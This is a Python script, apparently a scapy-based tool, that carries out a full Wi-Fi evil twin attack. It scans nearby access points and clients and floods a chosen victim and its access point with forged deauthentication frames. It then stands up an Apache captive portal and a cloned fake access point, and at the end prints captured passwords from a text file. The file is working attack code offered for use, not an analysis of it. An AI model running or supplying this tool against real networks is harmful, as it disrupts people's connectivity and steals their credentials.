import string
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
import CreateFakeAP as cf
import MonitorMode as mm
import os
import threading

ap_list = []
ssid_list = []
channel_list = []
client_list = []
user_interface = ""
ap_to_attack = ""
stop = False


def network_scanning():
    print("START scanning for access points for a minute")
    print("To stop before timeout -> press CTRL+C\n")
    print("INDEX           MAC              SSID                       CHANNEL")
    """ 
    We will give the interface name as parameter,
    so that we get only packets that are relevant to us,
    in addition on each of the packets we will run the function AP_filter
    """
    sniff(iface=user_interface, prn=AP_filter, timeout=60)


def AP_filter(packet):
    global ap_list
    """
    this function check if the packets from type 802.11, if so,
    she check if this is beacon frame and than append the AP to
    the list and save her mac address
    Dot11 - it's shorthand for the 802.11
    type = 0 - to indicate the frame is a management frame (type 0)
    subtype = 8 to indicate the management frames subtype is a beacon (type 8)
    """
    # if the packet type 802.11
    if packet.haslayer(Dot11) and packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in ap_list:
            ap_list.append(packet.addr2)  # addr2 - source mac address of sender
            ssid_list.append(packet.info.decode("utf-8"))  # ssid
            channel_list.append(packet.channel)
            print(" ", len(ap_list),
                  '      %s     %s                      %s     ' % (
                      packet.addr2, packet.info.decode("utf-8"), packet.channel))


def users_scanning():
    print("\nSTART scanning for connected clients ..")
    print("To stop -> press CTRL+C\n")
    print("INDEX            CLIENT MAC")
    """ 
    We will give the interface name as parameter,
    so that we get only packets that are relevant to us,
    in addition on each of the packets we will run the function users_filter
    """
    sniff(iface=user_interface, prn=users_filter)


def users_filter(packet):
    global client_list
    """
    this function check if the type of the packet is data type and if he connect to the desire AP, 
    if so, it will append the client into a list who saves all the clients.
    addr2 - source mac address of sender
    addr3- MAC address of AP 
    """

    try:
        if packet.addr3 == ap_to_attack and packet.addr2 not in ap_list and packet.addr2 not in client_list:
            client_list.append(packet.addr2)
            print(" ", len(client_list), "          ", packet.addr2)
    except:
        pass


def send_packets(sender, reciver, iface):
    """
    this function create fake Deauthentication packets and send them.
    """
    try:
        dot11 = Dot11(type=0, subtype=12, addr1=reciver, addr2=sender, addr3=sender)
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)  # create attack frame
        sendp(packet, inter=0.1, count=100, iface=iface, verbose=0)
    except:
        pass



def disconnect(target_mac, ap_attack_mac, interface_name):
    """
    this function send the fake packets in infinity loop.
    target_mac- user mac
    ap_attack_mac - network mac
    interface_name - the bad network
    --------
    dot11- to create 802.11 frame
    type = 0 , subtype=12 - Deauthentication packet
    addr1- destination MAC
    addr2- source MAC
    addr3- AP MAC
    """
    global stop
    while True:
        send_packets(target_mac, ap_attack_mac, interface_name) #ap to client
        send_packets(ap_attack_mac, target_mac, interface_name) #client to ap
        if stop:
            break


def start_apache():
    """
    this function forward our captive portal directory
    and start the apache2 server which will be our Main Server.
    also it defines the apache conf file (000-default).
    we've been helped with:

    """
    os.system('sudo rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
    os.system('sudo cp -r Captivportal/* /var/www/html')
    os.system('sudo chmod 777 /var/www/html/*')
    os.system('sudo chmod 777 /var/www/html')

    # update rules inside 000-default.conf of apache2
    os.system('sudo cp -f 000-default.conf /etc/apache2/sites-enabled')
    os.system('a2enmod rewrite >/dev/null 2>&1')  # enable the mod_rewrite in apache
    os.system('a2enmod php' + str(8.1) + ' >/dev/null 2>&1')  # enable php7.4 module in apache
    os.system('sudo systemctl restart apache2 >/dev/null 2>&1')


def set_settings(fap_iface, ssid, channel):
    """
    this function create 2 conf fils --> dnsmasq.conf, hostapd.conf
    also, it defines new rules in iptables
    """
    cf.create_hostapd_file(fap_iface, ssid, channel)
    cf.create_dnsmasq_file(fap_iface)


def restart(interface):
    """
    this function doing reset to the setting we were set.
    """
    os.system('service NetworkManager start')
    os.system('service apache2 stop >/dev/null 2>&1')
    os.system('service hostapd stop >/dev/null 2>&1')
    os.system('service dnsmasq stop >/dev/null 2>&1')
    os.system("killall dnsmasq >/dev/null 2>&1")
    os.system("killall hostapd >/dev/null 2>&1")
    os.system('iptables -F')
    os.system('iptables -t nat -F')
    os.system("rm dnsmasq.conf")
    os.system("rm hostapd.conf")
    os.system("sudo systemctl unmask systemd-resolved >/dev/null 2>&1")
    os.system("sudo systemctl enable systemd-resolved >/dev/null 2>&1")
    os.system("sudo systemctl start systemd-resolved >/dev/null 2>&1")
    mm.Stop_Monitor_Mode(interface)


def main_attack():
    global user_interface, ap_to_attack, stop
    user_interface = input("please enter the interface name you want to sniff on: ")
    fake_ap_interface = input("please enter the interface name you want for your fake AP: ")

    # ----------- STEP 1 - change to monitor mode -----------
    mm.Change_to_Monitor_Mode(user_interface)

    # -------------- START evil twin attack --------------
    # ----------- STEP 2 - WLAN scanning -----------
    network_scanning()

    # ----------- STEP 3 - Choose AP to attack -----------
    if len(ap_list) > 0:
        print("\n")
        index = int(input("Please enter the index of the SSID that you want to attack: ")) - 1
        channel_of_attack = channel_list[index]
        print("YOU CHOSE ->  ", ssid_list[index])

        # change the interface channel
        os.system("iwconfig " + user_interface + " channel " + str(channel_of_attack))

        # save the Attacked AP details
        ap_to_attack = ap_list[index]
        ssid_to_attack = ssid_list[index]

        # ----------- STEP 4 - Users scanning -----------
        users_scanning()

        # ----------- STEP 5 - Choose client to attack -----------
        if len(client_list) > 0:
            index = int(input("\nPlease enter the index of the client MAC that you want to attack: ")) - 1
            print("YOU CHOSE ->  ", client_list[index])
            user_mac = client_list[index]

            # ----------- STEP 6 - Disconnect the user from AP -----------
            # we will send deauthentication notification to the client and to ap.
            # it will keep sending as the program is running.
            print("\nStart deauthentication attack..")
            disconnect_thread = threading.Thread(target=disconnect, args=(user_mac, ap_to_attack, user_interface),
                                                 daemon=True)
            disconnect_thread.start()
            time.sleep(3)

            # ----------- STEP 7 - Create CaptivePortal -----------
            start_apache()
            print('\nappache server start successfully')
            time.sleep(1)

            # ----------- STEP 8 - Create fake AP -----------
            # we need to create two conf files -> dnsmasq.conf, hostapd.conf
            # and to set up the settings in iptables.
            set_settings(fake_ap_interface, ssid_to_attack, channel_of_attack)
            print('\ndnsmaq.conf & hostapd.conf create successfully')
            time.sleep(2)

            # ----------- STEP 9 - Clean and Exit the program -----------
            empty = input("\nPress Enter to Close Fake Accses Point AND Power OFF the fake AP.........\n")
            stop = True

            os.system("cat /var/www/html/passwords.txt")
            time.sleep(10)
            restart(user_interface)  # reset all the settings
            os.system("clear")
            time.sleep(2)
            sys.exit()

        else:
            print("There is not connected client to attack")

    else:
        print("There is not available AP to attack")


if __name__ == '__main__':
    main_attack()
    print("bye")
